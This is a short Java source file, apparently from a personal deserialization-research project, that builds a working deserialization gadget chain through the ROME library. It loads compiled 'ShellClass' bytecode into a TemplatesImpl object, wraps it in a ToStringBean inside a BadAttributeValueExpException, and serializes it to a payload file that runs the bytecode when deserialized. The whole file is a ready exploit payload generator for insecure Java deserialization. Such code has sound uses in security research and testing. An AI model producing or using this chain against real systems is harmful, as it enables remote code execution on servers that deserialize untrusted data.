package Seri.RomeGadgets;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import static Seri.Utils.*;

public class BAVEERome {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templateimpl = new TemplatesImpl();
        byte[] bytes = Files.readAllBytes(Paths.get("/Users/y1shin/IdeaProjects/Seri/target/classes/Seri/ShellClass.class"));

        setValue(templateimpl,"_name","aaa");
        setValue(templateimpl,"_bytecodes",new byte[][] {bytes});
        setValue(templateimpl,"_tfactory",new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(Templates.class,templateimpl);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(new Object());
        setValue(badAttributeValueExpException,"val",toStringBean);

        serialize(badAttributeValueExpException ,"bin/BAVEERome.bin");
        unserialize("bin/BAVEERome.bin");

    }
}
